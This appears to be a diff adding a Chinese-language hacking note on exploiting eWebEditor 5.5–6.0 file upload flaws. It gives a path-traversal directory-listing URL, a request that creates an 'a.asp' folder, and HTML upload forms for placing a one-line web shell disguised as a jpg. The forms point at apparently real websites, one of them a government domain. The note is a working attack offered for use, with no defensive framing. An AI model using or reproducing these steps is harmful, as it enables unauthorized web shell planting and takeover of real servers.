@@ -1,0 +1,37 @@
+对6.X的也管用，对ASP。aspx。JSP。均管用。
+
+直接列目录  ewebeditor/admin_uploadfile.asp?id=&dir=../.. 
+
+
+
+
+利用方法：
+先访问这个地址
+
+Editor/asp/upload.asp?action=save&type=image&style=popup&cusdir=a.asp
+
+访问这个地址可以建立个A.ASP的文件夹……
+再用这个html代码上传。
+
+<form action="http://www.cdws.gov.cn/news/ewebeditor/asp/upload.asp?action=save&type=image&style=popup&cusdir=a.asp" method=post name=myform enctype=”multipart/form-data”>
+<input type=file name=uploadfile size=100><br><br>
+<input type=submit value=upload>
+</form>
+
+
+http://xlgy.com/lgzynews/admin/editubb//asp/upload.asp?action=save&type=image&style=popup&cusdir=a.asp
+
+
+
+ewebeditor 5.5 - 6.0 漏洞
+我们构造这样一个页面
+http://www.xxxx.com/admin/ewebed ... up&cusdir=a.asp
+这样会在   网站目录下生产 a.asp这个文件夹
+然后再本地构造html
+<form action="http://www.xxxx.com/admin/ewebeditor/asp/upload.asp?action=savetype=image&style=popup&cusdir=a.asp" method=post name=myform enctype="multipart/form-data">
+<input type=file name=uploadfile size=100><br><br>
+<input type=submit value=upload>
+</form>
+
+然后打开 上传 一句话（jpg格式） 
+
